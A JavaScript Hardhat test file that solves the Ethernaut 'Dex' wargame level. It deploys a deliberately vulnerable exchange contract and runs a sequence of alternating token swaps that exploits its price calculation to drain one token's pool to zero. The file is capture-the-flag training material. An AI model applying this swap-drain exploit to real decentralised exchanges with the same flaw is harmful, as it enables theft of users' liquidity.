const { assert, expect } = require("chai")
const { network, deployments, ethers, getNamedAccounts } = require("hardhat")
const {
    developmentChains,
    networkConfig,
} = require("../../helper-hardhat-config")

const parseEther = ethers.utils.parseEther
const formatEther = ethers.utils.formatEther
const getBalance = ethers.provider.getBalance
const bytes32 = ethers.utils.formatBytes32String

if (!developmentChains.includes(network.name)) {
    describe.skip
} else {
    describe("ethernaut_dex Unit Tests", function () {
        let owner, user1, Dex, Token1, Token2
        beforeEach(async () => {
            ;[owner, user1] = await ethers.getSigners()
            const SwappableTokenContract = await ethers.getContractFactory(
                "SwappableToken"
            )
            const DexContract = await ethers.getContractFactory("Dex")
            Dex = await DexContract.deploy()

            Token1 = await SwappableTokenContract.deploy(
                Dex.address,
                "token1",
                "token1",
                110
            )
            Token2 = await SwappableTokenContract.deploy(
                Dex.address,
                "token2",
                "token2",
                110
            )

            await Dex.setTokens(Token1.address, Token2.address)

            // send token to dex
            await Token1.token_approve(owner.address, Dex.address, 100)
            await Token2.token_approve(owner.address, Dex.address, 100)
            await Dex.addLiquidity(Token1.address, 100)
            await Dex.addLiquidity(Token2.address, 100)
        })

        describe("break it", () => {
            it("default attack", async function () {
                // exchange have balance
                const showBalance = async () => {
                    let dex_token1 = await Dex.balanceOf(
                        Token1.address,
                        Dex.address
                    )
                    let dex_token2 = await Dex.balanceOf(
                        Token2.address,
                        Dex.address
                    )
                    let user_token1 = await Dex.balanceOf(
                        Token1.address,
                        owner.address
                    )
                    let user_token2 = await Dex.balanceOf(
                        Token2.address,
                        owner.address
                    )
                    console.log(
                        `dex: ${dex_token1} ${dex_token2}, user2: ${user_token1} ${user_token2}`
                    )
                    console.log(`===========================`)
                }

                await showBalance()

                await Token1.token_approve(owner.address, Dex.address, 10)
                await Dex.swap(Token1.address, Token2.address, 10)
                await showBalance()

                await Token2.token_approve(owner.address, Dex.address, 20)
                await Dex.swap(Token2.address, Token1.address, 20)
                await showBalance()

                await Token1.token_approve(owner.address, Dex.address, 24)
                await Dex.swap(Token1.address, Token2.address, 24)
                await showBalance()

                await Token2.token_approve(owner.address, Dex.address, 30)
                await Dex.swap(Token2.address, Token1.address, 30)
                await showBalance()

                await Token1.token_approve(owner.address, Dex.address, 41)
                await Dex.swap(Token1.address, Token2.address, 41)
                await showBalance()

                await Token2.token_approve(owner.address, Dex.address, 45)
                await Dex.swap(Token2.address, Token1.address, 45)
                await showBalance()

                expect(
                    await Dex.balanceOf(Token1.address, Dex.address)
                ).to.equal(0)
            })
        })
    })
}
